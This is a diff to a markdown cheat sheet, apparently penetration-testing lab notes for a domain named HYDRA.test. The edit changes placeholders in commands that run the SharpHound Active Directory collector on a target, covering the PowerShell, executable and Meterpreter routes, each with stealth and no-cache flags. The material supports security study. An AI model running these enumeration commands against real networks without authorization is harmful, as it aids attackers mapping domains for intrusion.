@@ -27,21 +27,21 @@ Somehow, someway, execute a BloodHound collector (located in **/usr/share/Bloodh
 
 ```powershell
 . .\SharpHound.ps1 # Source the script
-Invoke-BloodHound -CollectionMethod All -Domain {domain} -Stealth -NoSaveCache -CompressData # HYDRA.test
+Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth -NoSaveCache -CompressData # HYDRA.test
 ```
 
 **Target Machine, C# Collector**:
 
 ```powershell
-.\SharpHound.exe --CollectionMethod All --Domain {domain} -Stealth -NoSaveCache -CompressData # HYDRA.test
+.\SharpHound.exe --CollectionMethod All --Domain $DOMAIN --Stealth --NoSaveCache --CompressData # HYDRA.test
 ```
 
 **Meterpreter on Target Machine**:
 
 ```powershell
 meterpreter > use powershell
-meterpreter > powershell_import {path to SharpHound.ps1}
-meterpreter > powershell_execute "Invoke-BloodHound -CollectionMethod All -Domain {domain} -Stealth -NoSaveCache -CompressData" # HYDRA.test
+meterpreter > powershell_import $PATH_TO_SHARPHOUND_PS1
+meterpreter > powershell_execute "Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth -NoSaveCache -CompressData" # HYDRA.test
 ```
 
 ## Ingest
